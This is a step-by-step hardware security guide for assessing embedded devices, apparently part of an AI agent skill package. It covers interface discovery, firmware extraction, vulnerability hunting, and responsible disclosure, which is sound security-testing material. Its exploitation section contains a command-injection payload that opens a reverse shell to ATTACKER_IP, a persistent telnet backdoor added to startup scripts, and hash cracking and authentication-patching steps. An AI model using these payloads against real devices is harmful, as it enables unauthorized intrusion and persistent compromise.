# Guide: Embedded Firmware Analysis

> **Skill**: Hardware Security (`skills/hardware-security/SKILL.md`)
> **Phase coverage**: Phase 1 (Reconnaissance) through Phase 4 (Analysis)
> **Purpose**: Step-by-step methodology for unknown device assessment — from opening the box to having a searchable firmware filesystem

---

## 1. Device Reconnaissance

### 1.1 FCC ID Database Lookup

Every device sold in the United States is required to have an FCC ID printed on a label or engraved on the chassis. This ID is a gold mine for hardware intelligence.

**Procedure:**

1. Locate FCC ID on device label, battery compartment, or under the unit (format: `2-letter grantee code + product code`, e.g., `2ABCD-ROUTER123`).
2. Navigate to [https://www.fcc.gov/oet/ea/fccid](https://www.fcc.gov/oet/ea/fccid) and enter the ID.
3. Download from the filings:
   - **Internal Photos** — show PCB layout, chip placements, connector types
   - **External Photos** — show ports and physical interfaces
   - **Test Report** — often lists SoC model, memory sizes, radio chips
   - **User Manual** — may reveal default credentials, admin interfaces

**Alternative databases:**
- [https://fccid.io](https://fccid.io) — faster, better UI than the official FCC site
- [https://www.ifixit.com](https://www.ifixit.com) — community teardowns with annotated PCB photos
- [https://openwrt.org/toh/start](https://openwrt.org/toh/start) — OpenWrt Table of Hardware; lists debug interfaces for hundreds of routers

### 1.2 PCB Photography and Annotation

High-quality PCB documentation before any probing:

1. Remove device from enclosure. Use plastic pry tools to avoid ESD damage.
2. Photograph both sides of PCB under strong, even lighting. Capture:
   - Full PCB overview (both sides)
   - Close-up of SoC (main processor)
   - Close-up of flash chip
   - All connector headers and test points
   - All chip markings at readable resolution
3. Annotate photos with interface labels using an image editor or printed overlay.

### 1.3 Chip Identification

| Component | Where to Look | What to Record |
|-----------|--------------|----------------|
| SoC (main CPU) | Largest chip near center of PCB | Full marking text; search datasheet |
| NOR Flash | Small 8-pin chip near SoC | Manufacturer prefix (W25/MX25/GD25) + capacity code |
| NAND Flash | Larger chip, often BGA package | Full marking; check if ONFI compatible |
| EEPROM | Tiny 8-pin; often Atmel AT24Cxx | Model number for capacity and I2C address |
| WiFi/Radio | Often labeled with FCC ID itself | Module model for regulatory filings |

Common SoC families and their typical debug interfaces:

| SoC Family | Common in | Default Debug |
|------------|-----------|---------------|
| Qualcomm IPQ | High-end routers | UART + JTAG |
| MediaTek MT7621 | Consumer routers | UART (boot log + shell) |
| Broadcom BCM63xx | ISP-provided routers | JTAG (UART sometimes absent) |
| Realtek RTL8197 | Budget devices | UART |
| Microchip/Atmel AVR | Embedded controllers | JTAG or ISP |
| STM32 (ARM Cortex-M) | IoT sensors, controllers | SWD (2-wire JTAG) |

### 1.4 Interface Mapping Table Template

Use this table at the start of every assessment:

```
Device: [Make / Model / Firmware Version]
Date: [YYYY-MM-DD]
Assessor: [name]

| Interface | Location on PCB | Voltage | Confirmed | Notes |
|-----------|----------------|---------|-----------|-------|
| UART TX | J3 pin 1 | 3.3 V | Yes | Idle high, boot log at 115200 |
| UART RX | J3 pin 2 | 3.3 V | Yes | Accepts input |
| GND | J3 pin 3 | 0 V | Yes | — |
| JTAG TCK | TP7 | 3.3 V | No | Needs probing |
| JTAG TMS | TP8 | — | No | — |
| SPI CLK | U5 pin 6 | 3.3 V | Yes | W25Q64 flash chip |
| SPI MISO | U5 pin 2 | 3.3 V | Yes | — |
| SPI MOSI | U5 pin 5 | 3.3 V | Yes | — |
| SPI CS# | U5 pin 1 | 3.3 V | Yes | — |
```

---

## 2. Debug Interface Identification

### 2.1 Visual Inspection for UART Headers

UART debug headers share predictable physical patterns:

- **2-pin to 5-pin single-row header** near the edge of the PCB or close to the SoC
- Unpopulated footprints (holes without pins soldered) — these are the most common in production devices that had debug disabled before shipping
- Labeled silkscreen: `J1`, `DEBUG`, `CON1`, `UART`, `TX`, `RX`, `GND`
- 4-pin arrangement: GND, VCC, TX, RX (in many routers)

**Visual tip**: Look for a row of evenly spaced through-holes near the SoC that lack any visible component. These are almost always debug headers.

### 2.2 Multimeter Voltage Probing

**Procedure with device powered on:**

1. Set multimeter to DC voltage, range 0–5 V.
2. Place negative probe on known ground (metal chassis, USB shield, power connector GND).
3. Touch positive probe to each candidate pin:
   - **~3.3 V steady** = likely UART TX (idle-high logic), or VCC
   - **~5 V steady** = 5 V UART TX, or 5 V VCC rail
   - **0 V** = GND or UART RX (floating, pulled low)
   - **Voltage that drops briefly on boot then stabilizes** = strong TX indicator
4. The TX pin will show small fluctuations during active communication — place a small capacitor (0.1 µF) across meter leads to stabilize reading if fluctuation is high.

**Distinguishing TX from VCC**: TX pin voltage will drop briefly during active transmission. VCC will be rock-steady. A 1 kΩ resistor pulled to GND on a VCC pin will cause voltage drop; on TX (which has a series resistor in the SoC output driver) the drop will be proportionally different.

### 2.3 Logic Analyzer Connection Guide

For unknown baud rates or to confirm JTAG pin assignments:

```
Connections (example with 8-channel USB logic analyzer using sigrok):
  Channel D0 → Candidate TX pin
  Channel D1 → Candidate RX pin
  Channel D2 → Candidate TCK (if probing JTAG)
  Channel D3 → Candidate TMS
  GND → Device GND (CRITICAL: always share ground)
  Voltage threshold: set to 1.65 V for 3.3 V logic; 2.5 V for 5 V logic
```

```bash
# Capture during device boot (15-second window)
sigrok-cli -d fx2lafw --config samplerate=2MHz -C D0,D1 --time 15s -o /tmp/boot-capture.sr

# Decode UART at suspected baud rate
sigrok-cli -i /tmp/boot-capture.sr -P uart:baudrate=115200:rx=D0 -A uart=rx-data

# If baud rate unknown, try automated detection
sigrok-cli -i /tmp/boot-capture.sr -P uart:baudrate=0:rx=D0 -A uart=rx-data
```

---

## 3. Firmware Extraction Strategy Decision Tree

```
START: Target device in hand
         |
         v
   Physical chip access?
   (can you touch the flash chip with a clip or probe?)
         |
    YES  |  NO
         |      \
         v       v
    SPI NOR or   Can you interrupt
    NAND flash?  U-Boot / bootloader?
         |            |
    YES  |       YES  |  NO
         v            v    \
    Use flashrom    UART      OTA update
    + CH341A        exfil     available?
    (most reliable) (slow)        |
                            YES   |  NO
                             v    v
                         Download  Vendor
                         + decrypt website /
                         update pkg  support
                                     portal
                                       |
                                       v
                               Source code
                               on GitHub?
                               (check company
                                name + product)
```

**Method selection rationale:**

| Method | Speed | Reliability | Physical Access Required |
|--------|-------|-------------|-------------------------|
| SPI flash clip (flashrom) | Fast (2–5 min) | Very high | Yes — chip access |
| JTAG dump | Medium (10–30 min) | High | Yes — JTAG header |
| UART bootloader dump | Slow (hours) | Medium | Yes — UART header |
| OTA update interception | Medium (varies) | Medium | No |
| Vendor download | Fast | High | No |
| Source code | Fast | Very high | No |

---

## 4. binwalk Analysis Workflow

### Step-by-Step: Scan → Identify → Extract → Mount → Inventory

**Step 1: Initial scan**
```bash
binwalk firmware.bin
```
Read the output table: look for `Linux kernel`, `SquashFS filesystem`, `LZMA compressed data`, `gzip compressed data`, `JFFS2 filesystem`, `CramFS filesystem`.

**Step 2: Entropy analysis** (detect encrypted regions)
```bash
binwalk -E firmware.bin
# High entropy (>0.9) = likely encrypted or compressed
# Low entropy (<0.5) = likely plaintext code or padding
# Alternating = mixed content
```

**Step 3: Extract all recognized content**
```bash
binwalk -e -C /tmp/fw-out/ firmware.bin
ls /tmp/fw-out/
# Contents will be in a directory named after the binary: e.g., _firmware.bin.extracted/
```

**Step 4: Mount or further extract filesystem**
```bash
# SquashFS
unsquashfs -d /tmp/squashfs-root /tmp/fw-out/_firmware.bin.extracted/squashfs-root.img
# or for non-standard compressions:
sasquatch /tmp/fw-out/_firmware.bin.extracted/squashfs-root.img -d /tmp/squashfs-root

# JFFS2
jefferson /tmp/fw-out/_firmware.bin.extracted/jffs2-root.img -d /tmp/jffs2-root

# If binwalk failed to extract — manual dd extraction:
# From binwalk scan, note offset and compression type
# Example: SquashFS at offset 0x1A2C00
dd if=firmware.bin bs=1 skip=$((0x1A2C00)) | unsquashfs -d /tmp/manual-squashfs -
```

**Step 5: Inventory the extracted filesystem**
```bash
FWROOT="/tmp/squashfs-root"

# Count files by type
find "$FWROOT" -type f | wc -l
find "$FWROOT" -name "*.sh" | wc -l
find "$FWROOT" -name "*.conf" | wc -l
find "$FWROOT" -type f -executable | wc -l

# Tree overview (top 3 levels)
find "$FWROOT" -maxdepth 3 -type d | sort

# Find web server root
find "$FWROOT" -name "index.html" -o -name "index.asp" -o -name "index.lua" 2>/dev/null
```

---

## 5. Vulnerability Pattern Recognition

What to look for immediately after gaining access to the extracted filesystem:

### 5.1 Hardcoded Credentials

```bash
# Shadow file with hashes
cat "$FWROOT/etc/shadow"
# Hash formats: $1$ = MD5-crypt, $6$ = SHA-512. Crack with: hashcat -m 500 (MD5) or -m 1800 (SHA-512)

# Plaintext passwords in config files
grep -r -i "password\|passwd\|secret\|credential" "$FWROOT/etc/" -l

# Web interface credentials
grep -r -i "admin\|password\|auth" "$FWROOT/www/" --include="*.lua" --include="*.asp" | head -20
```

### 5.2 Debug Backdoors

```bash
# Hidden accounts in /etc/passwd
grep -v "nologin\|false\|halt\|sync" "$FWROOT/etc/passwd"

# Telnet/FTP enabled in init
grep -r "telnetd\|ftpd" "$FWROOT/etc/init.d/"

# Hardcoded SSH authorized keys
find "$FWROOT" -name "authorized_keys" -o -name "authorized_keys2" 2>/dev/null | xargs cat 2>/dev/null
```

### 5.3 Insecure Services

```bash
# Check for known-vulnerable service versions
strings "$FWROOT/usr/sbin/dropbear" | grep -E 'dropbear [0-9]'
strings "$FWROOT/usr/bin/openssl" | grep "OpenSSL"
strings "$FWROOT/usr/sbin/httpd" | grep -E 'GoAhead|lighttpd|mini_httpd' | head -5

# Check startup scripts for insecure flags
grep -r "\-\-no-auth\|\-\-allow-root\|--unsafe" "$FWROOT/etc/" 2>/dev/null
```

### 5.4 Weak Cryptography

```bash
# Find uses of MD5 or DES in scripts
grep -r "md5\|des\b\|rc4\|blowfish" "$FWROOT" --include="*.sh" --include="*.lua" -i | head -20

# Check TLS certificate validity
find "$FWROOT" -name "*.crt" -o -name "*.pem" 2>/dev/null | while read cert; do
  openssl x509 -in "$cert" -noout -subject -dates 2>/dev/null
done
```

### 5.5 Command Injection Points

Web interfaces in consumer firmware are frequent command injection targets:

```bash
# Look for shell execution in CGI/Lua handlers
grep -r "os.execute\|popen\|system(" "$FWROOT/www/" --include="*.lua" --include="*.cgi" | head -20

# Find user-controlled variables passed to system calls
grep -rn "REQUEST.*system\|QUERY_STRING.*exec\|FORM.*popen" "$FWROOT/www/" | head -20
```

---

## 6. Exploitation Development

### 6.1 From Firmware Analysis to Working Exploit

**Pathway A: UART Credential Reuse**
1. Extract credentials from `/etc/shadow` or config files.
2. Crack password hashes with: `hashcat -m 500 -a 0 hashes.txt rockyou.txt`
3. Attempt SSH/Telnet/web admin login with cracked credentials.
4. Document: time-to-crack, credential reuse across services.

**Pathway B: UART Shell Escalation**
1. Obtain UART console (see TC-HS-001).
2. If login prompt present, try default credentials from firmware analysis.
3. If root shell directly: run `mount -o rw,remount /` to gain persistent write access.
4. Modify startup script to add persistent backdoor: `echo 'telnetd &' >> /etc/init.d/rcS`

**Pathway C: Web Interface Command Injection**
1. Identify injection point in Lua/CGI handler from firmware code review.
2. Craft HTTP request with payload: `ping_target=127.0.0.1; id`
3. Observe output in HTTP response or system log.
4. Escalate to reverse shell: `ping_target=127.0.0.1; nc -e /bin/sh ATTACKER_IP 4444`

**Pathway D: Firmware Patching**
1. Identify target function in binary (e.g., `check_password()` in `httpd`).
2. Patch binary with radare2: `r2 -w "$FWROOT/usr/sbin/httpd"` → `wa nop` at comparison instruction.
3. Rebuild SquashFS: `mksquashfs /tmp/squashfs-root /tmp/patched-fs.img -comp lzma`
4. Reconstruct firmware binary with patched filesystem.
5. Flash patched firmware via UART bootloader TFTP or web update portal.

---

## 7. Reporting Hardware Findings

### 7.1 CVSSv3 Scoring for Hardware Vulnerabilities

Hardware vulnerabilities require careful CVSSv3 metric selection because physical access requirements directly affect the score:

| CVSS Metric | Typical Value for Hardware Vulns |
|-------------|----------------------------------|
| Attack Vector (AV) | **Physical (P)** if JTAG/UART required; **Network (N)** if triggered over network post-extraction |
| Attack Complexity (AC) | **Low (L)** for UART root shell; **High (H)** for fault injection |
| Privileges Required (PR) | **None (N)** for debug interfaces; **Low (L)** if user account needed |
| User Interaction (UI) | **None (N)** for hardware attacks |
| Scope (S) | **Changed (C)** if compromise enables attacking other systems (e.g., network) |
| Confidentiality | **High (H)** for firmware dump; **Low (L)** for partial disclosure |

Example scoring:
- UART unauthenticated root shell: **AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 6.8 Medium** (physical requirement caps score)
- Hardcoded credentials usable over network: **AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical**

### 7.2 Responsible Disclosure to IoT Vendors

**Timeline (standard responsible disclosure):**
1. **Day 0**: Initial discovery; document all findings.
2. **Day 1–7**: Identify security contact. Try `security@vendor.com`, `psirt@vendor.com`, or CVE numbering authority (CNA) if vendor is a CNA.
3. **Day 7**: Send initial disclosure email with: affected model/firmware version, finding summary (no full technical details yet), severity assessment, request for confirmation of receipt.
4. **Day 14**: If no response, send follow-up. CC national CERT if vendor is unresponsive.
5. **Day 90**: Full technical disclosure (CVSSv3, reproduction steps, PoC). This is the standard 90-day disclosure deadline.
6. **Day 90+**: Publish CVE and public advisory after vendor has had time to patch.

### 7.3 Physical Access Disclosure Requirements

All hardware security findings must clearly state physical access requirements in the report:

```markdown
## Physical Access Requirements

This assessment required the following physical access to the target device:
- [x] Device disassembly (enclosure removed)
- [x] PCB-level probe access (UART header)
- [ ] Chip desoldering (SPI flash removed from board)
- [ ] Specialized equipment (JTAGulator, flashrom programmer)

## Threat Model Relevance

Physical access requirement means the following attacker profiles are relevant:
- Malicious device repair technician
- Supply chain compromise at distribution/retail
- Insider threat with physical access to device location
- Attacker who has stolen the device (e.g., theft of edge computing appliance)
- Nation-state actor targeting critical infrastructure hardware
```

---

*This guide is part of the `hardware-security` skill domain. For attack commands and one-liners, see `payloads.md`. For structured test cases, see `test-cases.md`.*
